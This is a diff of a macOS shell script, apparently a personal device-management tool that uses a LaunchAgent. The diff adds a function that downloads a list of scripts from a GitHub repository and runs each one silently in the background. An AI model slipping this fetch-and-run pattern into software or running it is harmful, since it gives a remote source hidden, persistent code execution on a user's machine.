@@ -5,10 +5,6 @@ USERNAME=$(stat -f%Su /dev/console)
 HOME_DIR=$(eval echo "~${username}")
 repo="https://raw.githubusercontent.com/jaykepeters/unio/master"
 
-function execs() {
-    chmod +x "$HOME_DIR""/bin/"*
-}
-
 function confCheck() {
     la="user.DevTools.agent.plist"
     theLA="$HOME_DIR""/Library/LaunchAgents/""$la"
@@ -51,11 +47,23 @@ function confCheck() {
 
 function getJobs() {
     echo 'Retreiving New Jobs'
+    scripts=($(curl -sSL "$repo""/jobs/scripts"))
+    for script in "${scripts[@]}"; do
+        temp=$(mktemp -d)
+        echo -e 'Downloading:\t' "$script" to "$temp"
+        curl -sSL "$script" > "$temp""/script"
+        chmod +x "$temp""/script"
+        nohup "$temp""/script" &>/dev/null &
+    done
+}
+
+function execs() {
+    chmod +x "$HOME_DIR""/bin/"*
 }
 
 function main() {
-    execs
     confCheck
+    execs
     getJobs
 }
 
